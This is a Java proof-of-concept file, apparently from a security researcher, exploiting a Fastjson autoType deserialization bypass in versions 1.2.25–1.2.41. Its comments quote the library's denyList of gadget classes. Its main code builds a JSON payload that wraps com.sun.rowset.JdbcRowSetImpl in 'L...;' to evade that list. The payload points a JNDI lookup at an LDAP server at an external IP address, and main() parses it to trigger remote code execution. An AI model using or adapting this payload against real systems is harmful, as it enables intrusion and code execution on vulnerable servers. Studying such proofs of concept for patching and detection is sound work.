import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer;

/**
 * Created by xjj on 2023/3/7.
 */
public class FastJson2_GE1225LE1241 {
    // 1.autoTypeSupport修改为默认false
    // 2.DefaultJSONParser.parseObject()
    //    config.checkAutoType(typeName, null);
    //     内部增加denyList如下

    // bsh
    // com.mchange
    // com.sun.
    // java.lang.Thread
    // java.net.Socket
    // java.rmi
    // javax.xml
    // org.apache.bcel
    // org.apache.commons.beanutils
    // org.apache.commons.collections.Transformer
    // org.apache.commons.collections.functors
    // org.apache.commons.collections4.comparators
    // org.apache.commons.fileupload
    // org.apache.myfaces.context.servlet
    // org.apache.tomcat
    // org.apache.wicket.util
    // org.codehaus.groovy.runtime
    // org.hibernate
    // org.jboss
    // org.mozilla.javascript
    // org.python.core
    // org.springframework

    static {
        System.setProperty("com.alibaba.fastjson.parser.ParserConfig.autoTypeSupport", "true");
    }
    public static String jdbcRowSetImpl() {
        /**
         * 如果autoTypeSupport为 true, 只要类不在denyList则正常加载
         * 如果autoTypeSupport为 false(默认), 要求类不能出现在denyList, 且要在acceptList中
         */
        // poc 这块首尾加了L和;
        String poc = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"ldap://47.95.7.37:1389/Calc\", \"autoCommit\":true}";

        /**
         * 下面三种任选一种
         * JSON.parse(PoC);
         * JSON.parseObject(PoC);
         * JSONObject.parse(PoC);
         */
        return poc;
    }


    public static void main(String[] args) {
        String poc = jdbcRowSetImpl();
        JSON.parseObject(poc);
    }
}
